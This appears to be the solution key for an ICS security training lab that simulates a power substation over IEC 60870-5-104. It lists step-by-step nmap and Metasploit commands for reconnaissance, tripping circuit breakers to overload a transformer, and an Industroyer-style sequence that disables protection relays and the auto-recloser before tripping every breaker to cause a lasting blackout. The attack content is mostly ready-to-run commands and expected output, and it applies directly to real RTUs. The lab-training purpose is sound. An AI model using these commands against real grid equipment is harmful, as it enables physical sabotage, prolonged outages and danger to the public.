# Copperline Substation (Scenario 3): Solution Commands

**Facility:** 230/115kV Regional Power Substation
**Protocol:** IEC 60870-5-104 (real wire protocol, verified against nmap and Metasploit), Port 5022/TCP
**Common Address of ASDU (CA):** 1

---

## Real-world tooling & context

IEC 60870-5-104 ("IEC 104") is the international standard for telecontrol
between a SCADA master and substation RTUs, and one of the two protocols
INDUSTROYER/CRASHOVERRIDE (2016) had a purpose-built attack module for
(the other being IEC 61850). It has **no default authentication**:
anyone who can open a TCP connection can run a General Interrogation or
issue a control command.

| Step | Tools shown here |
|------|------------------|
| Port discovery | `nmap` |
| Protocol identification | `nmap`'s `iec-identify` NSE script |
| Read / enumerate | Metasploit `auxiliary/client/iec104/iec104` (General Interrogation) |
| Write / manipulate | Metasploit `auxiliary/client/iec104/iec104` (Double/Single command) |

**Standard port vs. training port.** Real IEC 104 runs on **TCP 2404**;
this lab uses **5022**. `nmap`'s `iec-identify` script has a hard-wired
port rule (`shortport.port_or_service(2404, "iec-104", "tcp")`), the same
situation as `modbus-discover` in the HydraGuard scenario, so it simply
won't fire against a non-standard port. The script itself is genuine and
works perfectly (verified directly against this lab's outstation when
pointed at port 2404); for the training port 5022, Metasploit's module
is the right tool since `RPORT` is just a normal option you set.

**Breakers use Double Command, not Single Command.** A real breaker
reports two physical contacts (open/closed), so IEC 104 models it as a
*double point* (status) and *double command* (control). This is also
Metasploit's own documented default example (`COMMAND_TYPE 46`). The five
protection relay enables are plain booleans, so they use *single point*
and *single command* (`COMMAND_TYPE 45`) instead.

**Double command values.** For `COMMAND_TYPE 46` the `COMMAND_VALUE` byte
is the DCO field: the low two bits select the state (1 = OFF/open/trip,
2 = ON/close). With a short-pulse qualifier that gives **5 = trip/open**
and **6 = close**. (Metasploit's inline module comment labels these the
other way around; the values above are the IEC standard encoding and are
what this outstation acts on.)

---

## Phase 1: IED Reconnaissance

**Objective:** Discover the IEC 104 outstation and enumerate all information points.

```bash
# Step 1: Port scan
nmap -sT -p 5022 localhost

# Step 2 (reference): confirm the real iec-identify script works against
# the standard port. Not usable against 5022 directly, see note above.
nmap --script iec-identify -p 2404 <host-running-on-2404>
# | iec-identify:
# |   ASDU address: 1
# |_  Information objects: 24

# Step 3: Identify + enumerate via Metasploit (works against any port)
msfconsole -q
use auxiliary/client/iec104/iec104
set RHOSTS 127.0.0.1
set RPORT 5022
set ASDU_ADDRESS 1
set COMMAND_TYPE 100        # C_IC_NA_1, General Interrogation
run
# Response includes every M_DP_NA_1 (breakers), M_SP_NA_1 (relays), and
# M_ME_NC_1 (measurement) point the outstation holds. This IS the recon.
```

---

## Phase 2: Live Telemetry Monitoring

**Objective:** Monitor real-time substation measurements to understand normal operating state.

```bash
# Re-run the General Interrogation and read the values back
msfconsole -q
use auxiliary/client/iec104/iec104
set RHOSTS 127.0.0.1
set RPORT 5022
set COMMAND_TYPE 100
run
# Normal: Freq ~60.0 Hz (IOA 201), TX1/TX2 loading ~38% (IOA 207/208),
# all 5 protection relays reporting ON (IOA 101-105). These are your
# Phase 4 targets.
```

Repeat `run` every few seconds to watch values change live. Metasploit
re-sends the General Interrogation each time (there is no continuous
"watch" mode in the module, so re-running is the equivalent of polling).

---

## Phase 3: Selective Circuit Breaker Tripping

**Objective:** Trip circuit breakers to shed load and overload transformers.
CB3 (TX1 primary, IOA 3) is the high-value target: once TX1 is gone, TX2
must carry 190 MW alone on a 200 MVA rating.

```bash
msfconsole -q
use auxiliary/client/iec104/iec104
set RHOSTS 127.0.0.1
set RPORT 5022
set ASDU_ADDRESS 1

# Trip CB5 (Feeder A, Industrial, 80 MW). COMMAND_TYPE 46 = C_DC_NA_1
# (Double Command). COMMAND_VALUE 5 = trip/open, 6 = close (short pulse).
set COMMAND_TYPE 46
set COMMAND_ADDRESS 5
set COMMAND_VALUE 5
run

# Trip CB6 (Feeder B, Residential, 65 MW)
set COMMAND_ADDRESS 6
run

# Trip CB3 (TX1 Primary, HIGH VALUE TARGET)
set COMMAND_ADDRESS 3
run

# Watch TX2 climb: re-run a General Interrogation
set COMMAND_TYPE 100
run
# With protection ENABLED: overcurrent relay trips TX2 and causes blackout.
# With protection DISABLED: TX2 runs hot and fails thermally in ~90s.
```

---

## Phase 4: Industroyer Pattern, Coordinated Blackout

**Objective:** Disable protection relays and trip ALL circuit breakers to cause
a permanent blackout, mirroring the INDUSTROYER/CRASHOVERRIDE malware (Sandworm,
Ukraine 2016): disable protection first, then trip everything, then disable
auto-recloser so operators cannot remotely reconnect.

```bash
msfconsole -q
use auxiliary/client/iec104/iec104
set RHOSTS 127.0.0.1
set RPORT 5022
set ASDU_ADDRESS 1

# Step 1: Disable ALL protection relays (the Industroyer setup step).
# COMMAND_TYPE 45 = C_SC_NA_1 (Single Command). COMMAND_VALUE 0 = OFF.
set COMMAND_TYPE 45
set COMMAND_VALUE 0
set COMMAND_ADDRESS 101   # PROT1, Master protection relay
run
set COMMAND_ADDRESS 102   # DFPT1, 87T differential relay
run
set COMMAND_ADDRESS 103   # OCPT1, 51 overcurrent relay
run
set COMMAND_ADDRESS 104   # UFPT1, 81L under-frequency relay
run
set COMMAND_ADDRESS 105   # RREC1, 79 auto-recloser
run

# Step 2: Rapid CB trip sequence: loads, then transformers, then sources.
# COMMAND_TYPE 46 = Double Command, COMMAND_VALUE 5 = trip/open.
set COMMAND_TYPE 46
set COMMAND_VALUE 5
set COMMAND_ADDRESS 7   # CB7, Feeder C (Critical)
run
set COMMAND_ADDRESS 6   # CB6, Feeder B (Residential)
run
set COMMAND_ADDRESS 5   # CB5, Feeder A (Industrial)
run
set COMMAND_ADDRESS 4   # CB4, TX2 Primary
run
set COMMAND_ADDRESS 3   # CB3, TX1 Primary
run
set COMMAND_ADDRESS 2   # CB2, Source 2 (Grid interconnect)
run
set COMMAND_ADDRESS 1   # CB1, Source 1 (Main generation)
run

# Step 3: Verify blackout with a General Interrogation, check all points
set COMMAND_TYPE 100
run
# All 7 breakers should read OFF (open). IOA 300 (BLACKOUT) should be ON.
# Frequency (IOA 201) should be collapsing toward 0 Hz.

# Bonus: attempt operator reconnection (it will fail, protection is down)
set COMMAND_TYPE 46
set COMMAND_VALUE 6   # close
set COMMAND_ADDRESS 1
run
# ... repeat COMMAND_ADDRESS 2 through 7.
# Without protection relays and with thermal damage already done,
# reconnection is unsafe. This is the real impact: hours/days of outage.
```
